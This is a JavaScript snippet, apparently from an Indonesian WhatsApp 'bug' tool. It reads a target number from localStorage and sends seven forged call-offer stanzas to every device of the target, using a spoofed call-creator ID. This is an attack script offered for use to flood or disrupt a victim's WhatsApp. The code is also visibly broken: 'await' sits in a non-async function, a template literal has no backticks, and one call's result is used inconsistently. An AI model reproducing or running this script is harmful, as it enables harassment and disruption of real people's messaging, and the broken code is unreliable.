(function(){
  const target = localStorage.getItem("bug_target");
  if (!target) return alert("Target belum diatur!");
  alert("🚀 Menjalankan BUG: FORCE1MSG ke " + target);
  // async function forceaja(target) {
  for (let i = 0; i < 7; i++) {
    const callId = (await crypto.randomBytes(16)).toString('base64');
    const offerContent = [];

    const audio16000 = { tag: 'audio', attrs: { enc: 'opus', rate: '16000' } };
    const audio8000 = { tag: 'audio', attrs: { enc: 'opus', rate: '8000' } };

    offerContent.push(audio16000, audio8000);

    const net = { tag: 'net', attrs: { medium: '3' }, content: [] };
    const capability = { tag: 'capability', attrs: { ver: '1' }, content: [] };
    const encopt = { tag: 'encopt', attrs: { keygen: '2' }, content: [] };

    offerContent.push(net, capability, encopt);

    const encKey = await crypto.randomBytes(32);

    let devices = await dim.getUSyncDevices(target, true);
    devices = await Promise.all(
      devices.map(async (jid) => {
        const user = jid.user;
        const device = jid.device ? ':' + jid.device : '';
        return ${user}${device}@s.whatsapp.net;
      })
    );

    await dim.assertSessions(devices, true);

    const { nodes: destinations, shouldIncludeDeviceIdentity } =
      await dim.getUSyncDevices(target, true);

    offerContent.push({
      tag: 'destination',
      attrs: {},
      content: destinations,
    });

    if (shouldIncludeDeviceIdentity) {
      const deviceIdentity = {
        tag: 'device-identity',
        attrs: {},
        content: await encodeSignedDeviceIdentity(target),
      };
      offerContent.push(deviceIdentity);
    }

    const stanza = {
      tag: 'call',
      attrs: {
        from: dim.user.id,
        to: target,
        id: '0',
      },
      content: [
        {
          tag: 'offer',
          attrs: {
            'call-id': callId,
            'call-creator': '696969696969@s.whatsapp.net',
          },
          content: offerContent,
        },
      ],
    };

    await dim.sendNode(stanza);
  }
}
